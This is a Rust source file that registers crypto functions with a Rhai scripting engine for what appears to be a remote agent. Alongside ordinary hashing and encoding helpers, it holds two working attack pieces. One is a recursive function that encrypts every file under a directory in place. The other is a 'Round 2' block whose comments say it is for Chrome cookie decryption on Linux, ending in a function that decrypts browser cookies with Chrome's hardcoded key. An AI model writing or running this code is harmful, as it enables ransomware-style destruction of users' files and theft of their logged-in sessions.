// src/agent/scripting/crypto.rs
use rhai::Engine;
use std::fs;
use walkdir::WalkDir;
use aes_gcm::aead::OsRng;
use rand::RngCore;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use uuid::Uuid;
use super::helpers::{
    sha256_hex, sha256_bytes_hex, md5_hex, hmac_sha256_hex,
    crc32_hash, fnv1a_hash, do_encrypt, do_decrypt, aes_cipher_from_hex,
};

pub fn register(engine: &mut Engine) {

    // ── Key generation ────────────────────────────────────────────────────────

    engine.register_fn("internal_keygen", || -> String {
        let mut key = [0u8; 32];
        OsRng.fill_bytes(&mut key);
        hex::encode(key)
    });

    engine.register_fn("internal_uuid", || -> String {
        Uuid::new_v4().to_string()
    });

    // ── Hash functions ────────────────────────────────────────────────────────

    engine.register_fn("internal_sha256", |s: &str| -> String {
        sha256_hex(s)
    });

    engine.register_fn("internal_sha256_bytes", |hex_in: &str| -> String {
        match hex::decode(hex_in) {
            Ok(bytes) => sha256_bytes_hex(&bytes),
            Err(_)    => sha256_hex(hex_in), // treat as literal string
        }
    });

    engine.register_fn("internal_md5", |s: &str| -> String {
        md5_hex(s)
    });

    engine.register_fn("internal_hmac", |key_hex: &str, data: &str| -> String {
        let key = match hex::decode(key_hex) {
            Ok(k)  => k,
            Err(_) => key_hex.as_bytes().to_vec(),
        };
        hmac_sha256_hex(&key, data.as_bytes()).unwrap_or_else(|e| e)
    });

    engine.register_fn("internal_crc32", |s: &str| -> String {
        (crc32_hash(s.as_bytes()) as i64).to_string()
    });

    engine.register_fn("internal_fnv1a", |s: &str| -> String {
        fnv1a_hash(s.as_bytes()).to_string()
    });

    // ── Encoding ──────────────────────────────────────────────────────────────

    engine.register_fn("internal_base64_encode", |s: &str| -> String {
        BASE64.encode(s.as_bytes())
    });

    engine.register_fn("internal_base64_encode_hex", |hex_in: &str| -> String {
        match hex::decode(hex_in) {
            Ok(bytes) => BASE64.encode(&bytes),
            Err(_)    => BASE64.encode(hex_in.as_bytes()),
        }
    });

    engine.register_fn("internal_base64_decode", |b64: &str| -> String {
        match BASE64.decode(b64.trim()) {
            Ok(bytes) => String::from_utf8(bytes.clone())
                .unwrap_or_else(|_| hex::encode(bytes)),
            Err(e) => format!("Error: {}", e),
        }
    });

    engine.register_fn("internal_hex_encode", |s: &str| -> String {
        hex::encode(s.as_bytes())
    });

    engine.register_fn("internal_hex_decode", |h: &str| -> String {
        match hex::decode(h) {
            Ok(bytes) => String::from_utf8(bytes)
                .unwrap_or_else(|_| "Error: not valid UTF-8".into()),
            Err(e) => format!("Error: {}", e),
        }
    });

    engine.register_fn("internal_xor", |data_hex: &str, key_hex: &str| -> String {
        let data = match hex::decode(data_hex) {
            Ok(d)  => d,
            Err(e) => return format!("Error: {}", e),
        };
        let key = match hex::decode(key_hex) {
            Ok(k)  => k,
            Err(e) => return format!("Error: {}", e),
        };
        if key.is_empty() { return "Error: empty key".to_string(); }
        let out: Vec<u8> = data.iter()
            .enumerate()
            .map(|(i, &b)| b ^ key[i % key.len()])
            .collect();
        hex::encode(out)
    });

    // ── In-memory AES-256-GCM (hex buffer → hex buffer) ───────────────────────

    engine.register_fn("internal_encrypt_bytes", |data_hex: &str, key_hex: &str| -> String {
        let data   = match hex::decode(data_hex) {
            Ok(d)  => d,
            Err(_) => data_hex.as_bytes().to_vec(),
        };
        let cipher = match aes_cipher_from_hex(key_hex) { Ok(c) => c, Err(e) => return e };
        match do_encrypt(&cipher, &data) { Ok(out) => hex::encode(out), Err(e) => e }
    });

    engine.register_fn("internal_decrypt_bytes", |data_hex: &str, key_hex: &str| -> String {
        let data   = match hex::decode(data_hex) {
            Ok(d)  => d,
            Err(e) => return format!("Error: {}", e),
        };
        let cipher = match aes_cipher_from_hex(key_hex) { Ok(c) => c, Err(e) => return e };
        match do_decrypt(&cipher, &data) { Ok(out) => hex::encode(out), Err(e) => format!("Error: {}", e) }
    });

    // ── File-based AES-256-GCM ────────────────────────────────────────────────

    engine.register_fn("internal_encrypt_file", |path: &str, key_hex: &str| -> String {
        let cipher    = match aes_cipher_from_hex(key_hex) { Ok(c) => c, Err(e) => return e };
        let plaintext = match fs::read(path) { Ok(d) => d, Err(e) => return format!("Read Error: {}", e) };
        match do_encrypt(&cipher, &plaintext) {
            Ok(data) => match fs::write(path, data) {
                Ok(_)  => "Success".into(),
                Err(e) => format!("Write Error: {}", e),
            },
            Err(e) => e,
        }
    });

    engine.register_fn("internal_decrypt_file", |path: &str, key_hex: &str| -> String {
        let cipher    = match aes_cipher_from_hex(key_hex) { Ok(c) => c, Err(e) => return e };
        let encrypted = match fs::read(path) { Ok(d) => d, Err(e) => return format!("Read Error: {}", e) };
        match do_decrypt(&cipher, &encrypted) {
            Ok(data) => match fs::write(path, data) {
                Ok(_)  => "Success".into(),
                Err(e) => format!("Write Error: {}", e),
            },
            Err(e) => e,
        }
    });

    engine.register_fn("internal_encrypt_recursive", |root_path: &str, key_hex: &str| -> String {
        let cipher = match aes_cipher_from_hex(key_hex) { Ok(c) => c, Err(e) => return e };
        let (mut ok, mut fail) = (0usize, 0usize);
        for entry in WalkDir::new(root_path).into_iter().filter_map(|e| e.ok()) {
            if entry.file_type().is_file() {
                let path = entry.path();
                if let Ok(pt) = fs::read(path) {
                    if let Ok(ct) = do_encrypt(&cipher, &pt) {
                        if fs::write(path, ct).is_ok() { ok += 1; } else { fail += 1; }
                    } else { fail += 1; }
                } else { fail += 1; }
            }
        }
        format!("Encrypted: {}, Failed: {}", ok, fail)
    });

    engine.register_fn("internal_decrypt_recursive", |root_path: &str, key_hex: &str| -> String {
        let cipher = match aes_cipher_from_hex(key_hex) { Ok(c) => c, Err(e) => return e };
        let (mut ok, mut fail) = (0usize, 0usize);
        for entry in WalkDir::new(root_path).into_iter().filter_map(|e| e.ok()) {
            if entry.file_type().is_file() {
                let path = entry.path();
                if let Ok(ct) = fs::read(path) {
                    if let Ok(pt) = do_decrypt(&cipher, &ct) {
                        if fs::write(path, pt).is_ok() { ok += 1; } else { fail += 1; }
                    } else { fail += 1; }
                } else { fail += 1; }
            }
        }
        format!("Decrypted: {}, Failed: {}", ok, fail)
    });
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Round 2 additions: PBKDF2 key derivation + AES-CBC decryption
// Used for Chrome cookie decryption on Linux (v80+: AES-128-CBC, key =
// PBKDF2-SHA1("peanuts", "saltysalt", 1, 16)).
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

pub fn register_crypto_ext(engine: &mut rhai::Engine) {
    use pbkdf2::pbkdf2_hmac;
    use sha1::Sha1;
    use aes::Aes128;
    use cbc::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};

    // PBKDF2-HMAC key derivation.
    // hash_algo: "sha1" | "sha256"   (sha1 needed for Chrome Linux)
    // Returns hex-encoded derived key.
    engine.register_fn("internal_pbkdf2", |password: &str, salt_hex: &str, iterations: i64, hash_algo: &str, key_len: i64| -> String {
        let salt = match hex::decode(salt_hex) {
            Ok(s) => s,
            Err(_) => salt_hex.as_bytes().to_vec(),
        };
        let iter = iterations.max(1) as u32;
        let klen = key_len.max(1).min(64) as usize;
        let mut key = vec![0u8; klen];
        match hash_algo {
            "sha1"   => pbkdf2_hmac::<Sha1>  (password.as_bytes(), &salt, iter, &mut key),
            "sha256" => pbkdf2_hmac::<sha2::Sha256>(password.as_bytes(), &salt, iter, &mut key),
            other    => return format!("Error: unsupported hash {}", other),
        }
        hex::encode(key)
    });

    // AES-128-CBC decryption.
    // All inputs are hex-encoded.  Returns hex plaintext or "Error: ...".
    engine.register_fn("internal_aes128_cbc_decrypt", |data_hex: &str, key_hex: &str, iv_hex: &str| -> String {
        let data = match hex::decode(data_hex) { Ok(d) => d, Err(e) => return format!("Error: {}", e) };
        let key  = match hex::decode(key_hex)  { Ok(k) => k, Err(e) => return format!("Error: {}", e) };
        let iv   = match hex::decode(iv_hex)   { Ok(i) => i, Err(e) => return format!("Error: {}", e) };
        if key.len() != 16 { return "Error: key must be 16 bytes for AES-128".into(); }
        if iv.len()  != 16 { return "Error: IV must be 16 bytes".into(); }
        type Aes128CbcDec = cbc::Decryptor<Aes128>;
        let key_arr: [u8; 16] = match key.try_into() { Ok(a) => a, Err(_) => return "Error: key len".into() };
        let iv_arr:  [u8; 16] = match iv.try_into()  { Ok(a) => a, Err(_) => return "Error: iv len".into() };
        match Aes128CbcDec::new(&key_arr.into(), &iv_arr.into())
            .decrypt_padded_vec_mut::<Pkcs7>(&data) {
            Ok(pt) => hex::encode(pt),
            Err(e) => format!("Error: unpad failed: {:?}", e),
        }
    });

    // AES-256-CBC decryption.
    engine.register_fn("internal_aes256_cbc_decrypt", |data_hex: &str, key_hex: &str, iv_hex: &str| -> String {
        use aes::Aes256;
        let data = match hex::decode(data_hex) { Ok(d) => d, Err(e) => return format!("Error: {}", e) };
        let key  = match hex::decode(key_hex)  { Ok(k) => k, Err(e) => return format!("Error: {}", e) };
        let iv   = match hex::decode(iv_hex)   { Ok(i) => i, Err(e) => return format!("Error: {}", e) };
        if key.len() != 32 { return "Error: key must be 32 bytes for AES-256".into(); }
        if iv.len()  != 16 { return "Error: IV must be 16 bytes".into(); }
        type Aes256CbcDec = cbc::Decryptor<Aes256>;
        let key_arr: [u8; 32] = match key.try_into() { Ok(a) => a, Err(_) => return "Error: key len".into() };
        let iv_arr:  [u8; 16] = match iv.try_into()  { Ok(a) => a, Err(_) => return "Error: iv len".into() };
        match Aes256CbcDec::new(&key_arr.into(), &iv_arr.into())
            .decrypt_padded_vec_mut::<Pkcs7>(&data) {
            Ok(pt) => hex::encode(pt),
            Err(e) => format!("Error: unpad failed: {:?}", e),
        }
    });

    // Convenience: decrypt a Chrome Linux encrypted cookie value.
    // Chrome uses: PBKDF2-SHA1("peanuts", "saltysalt", 1, 16) → AES-128-CBC
    // with IV = b"\x20" * 16, and the ciphertext starts at byte 3 (after "v10" prefix).
    engine.register_fn("internal_chrome_decrypt_linux", |encrypted_hex: &str| -> String {
        let mut data = match hex::decode(encrypted_hex) {
            Ok(d) => d,
            Err(e) => return format!("Error: {}", e),
        };
        // Strip "v10" / "v11" prefix (3 bytes).
        if data.len() > 3 && &data[..3] == b"v10" || (data.len() > 3 && &data[..3] == b"v11") {
            data = data[3..].to_vec();
        }
        let mut key = [0u8; 16];
        pbkdf2_hmac::<Sha1>(b"peanuts", b"saltysalt", 1, &mut key);
        let iv = [b' '; 16]; // 0x20 * 16
        type Aes128CbcDec = cbc::Decryptor<Aes128>;
        match Aes128CbcDec::new(&key.into(), &iv.into())
            .decrypt_padded_vec_mut::<Pkcs7>(&data) {
            Ok(pt) => String::from_utf8_lossy(&pt).to_string(),
            Err(e) => format!("Error: {:?}", e),
        }
    });
}
